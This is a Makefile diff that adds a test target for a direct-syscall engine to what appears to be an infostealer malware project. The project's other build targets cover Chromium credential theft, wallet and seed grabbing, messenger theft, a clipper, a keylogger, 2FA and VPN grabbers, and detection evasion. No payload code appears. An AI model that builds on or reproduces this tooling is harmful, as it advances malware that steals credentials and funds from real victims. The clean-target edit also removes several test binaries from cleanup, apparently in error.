@@ -117,7 +117,7 @@ test-hash: tests/test_hash.c src/types/hash.c include/hash.h include/config.h
 TEST_CC = gcc
 TEST_CFLAGS = -Wall -Wextra -O2 -Iinclude -Isrc/parsers -Isrc/utils -std=c11
 
-test-unit: test-crypto test-peb test-sqlite test-chromium test-wallets test-messengers test-network test-evasion
+test-unit: test-crypto test-peb test-engine test-sqlite test-chromium test-wallets test-messengers test-network test-evasion
 	@echo "=== ALL UNIT TESTS PASSED ==="
 
 test-crypto: tests/test_crypto.c src/crypto/chacha_poly.c src/utils/secure_zero.c
@@ -131,6 +131,10 @@ test-sqlite: tests/test_sqlite.c src/parsers/sqlite.c
 test-peb: tests/test_peb.c src/types/hash.c src/types/peb.c
 	$(TEST_CC) $(TEST_CFLAGS) -DZIALFI_TEST_MODE -o tests/test_peb tests/test_peb.c src/types/hash.c src/types/peb.c
 	./tests/test_peb
+
+test-engine: tests/test_engine.c src/syscalls/engine.c src/types/hash.c src/types/peb.c src/types/export_resolve.c include/engine.h include/mirage_asm.h
+	$(TEST_CC) $(TEST_CFLAGS) -DZIALFI_TEST_MODE -Wno-error -Isrc/syscalls -o tests/test_engine tests/test_engine.c src/syscalls/engine.c src/types/hash.c src/types/peb.c src/types/export_resolve.c
+	./tests/test_engine
 
 test-chromium: tests/test_chromium.c tests/peb_stub.c src/browsers/browser_paths.c src/types/hash.c src/utils/file_utils.c src/types/peb.c src/types/export_resolve.c src/rt/rt_str.c
 	$(TEST_CC) $(TEST_CFLAGS) -O0 -DZIALFI_TEST_MODE -o tests/test_chromium tests/test_chromium.c tests/peb_stub.c src/browsers/browser_paths.c src/types/hash.c src/utils/file_utils.c src/types/peb.c src/types/export_resolve.c src/rt/rt_str.c
@@ -154,7 +158,7 @@ test-evasion: tests/test_evasion.c src/evasion/detection.c src/types/hash.c
 
 clean-tests:
 	rm -f tests/test_crypto tests/test_sqlite tests/test_peb tests/test_chromium \
-	      tests/test_wallets tests/test_messengers tests/test_network tests/test_evasion \
+	      tests/test_engine \
 	      tests/test_lz4 tests/test_chunked tests/test_rt tests/test_seed_grabber \
 	      tests/test_scoring tests/test_asn1 tests/test_base64 tests/test_json_extract \
 	      tests/*.o tests/*.gcda tests/*.gcno
@@ -246,7 +250,7 @@ test-file-utils: tests/test_file_utils.c src/utils/file_utils.c src/types/hash.c
 	./tests/test_file_utils
 
 # ── Aggregate target ─────────────────────────────────────────
-test-all: test-hash test-crypto test-sqlite test-peb test-chromium test-wallets \
+test-all: test-hash test-crypto test-sqlite test-peb test-engine test-chromium test-wallets \
           test-messengers test-network test-evasion test-lz4 \
           test-rt test-scoring test-asn1 test-base64 \
           test-mock-seams test-fixtures test-sqlite-fault test-network-mock test-crypto-mock test-clipper test-wifi test-keylogger test-gaming test-twofa test-vpn \
